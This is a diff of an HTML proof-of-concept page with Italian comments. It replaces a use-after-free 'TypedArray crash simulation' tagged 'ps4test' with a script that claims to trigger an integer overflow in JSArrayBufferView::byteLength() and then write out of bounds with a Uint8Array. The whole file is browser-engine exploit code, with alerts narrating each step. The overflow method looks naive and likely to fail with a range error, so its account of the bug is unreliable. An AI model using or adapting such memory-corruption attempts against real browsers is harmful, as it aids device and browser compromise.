@@ -1,48 +1,34 @@
 <!DOCTYPE html>
-<html>
+<html lang="it">
 <head>
-  <meta charset="UTF-8">
-  <title>TypedArray Crash Simulation</title>
+    <meta charset="UTF-8" />
+   
 </head>
 <body>
-  <h1> 2 TypedArray Crash Simulation</h1>
+    <h1>PoC Integer Overflow in JSArrayBufferView::byteLength()</h1>
+    <script>
+        try {
+            // 1. Creiamo un array molto grande:
+            const big = new Array(0x7fffffff);
+            alert(`Passo 1: creato array "big" con length = ${big.length}`);
 
-  <script>
-    let externalMemory = new Uint8Array(0x100);
+            // 2. Duplichiamo via spread per far overflow della length:
+            const overflowed = [0, ...big, ...big];
+            alert(`Passo 2: array "overflowed" creato, length interna = ${overflowed.length}`);
 
-    function fakeDeallocator(view, context) {
-      alert("[deallocator] Eseguo liberazione...");
+            // 3. Creiamo il TypedArray senza overflow check:
+            const ta = new Uint8Array(overflowed);
+            alert(`Passo 3: nuovo Uint8Array creato, ta.length = ${ta.length}`);
 
-      // Elimina ogni riferimento
-      externalMemory = null;
+            // 4. Scrittura fuori dai limiti reali del buffer:
+            const oobIndex = overflowed.length;
+            ta[oobIndex] = 0x41;
+            alert(`Passo 4: tentata scrittura OOB all’indice ${oobIndex}`);
 
-      // Forza il GC
-      for (let i = 0; i < 10000; i++) {
-        let tmp = new ArrayBuffer(0x1000);
-      }
-    }
-
-    function createTypedArrayWithExternalBuffer(bytes, length, destructor, context) {
-      const buffer = bytes.buffer;
-      const view = new Uint8Array(buffer, 0, length);
-      return {
-        view,
-        destroy() {
-          if (destructor) destructor(view, context);
+            alert('PoC completato senza eccezioni.');
+        } catch (e) {
+            alert(`Errore rilevato: ${e.name}: ${e.message}`);
         }
-      };
-    }
-
-    alert("Creo il TypedArray...");
-    const handle = createTypedArrayWithExternalBuffer(externalMemory, 0x100, fakeDeallocator, "ps4test");
-
-    alert("Distruggo...");
-    handle.destroy();
-
-    alert("Provo ad accedere...");
-    handle.view[0] = 0x41; // <<< Qui può crashare
-
-    alert("Se vedi questo alert, NON è crashato.");
-  </script>
+    </script>
 </body>
 </html>
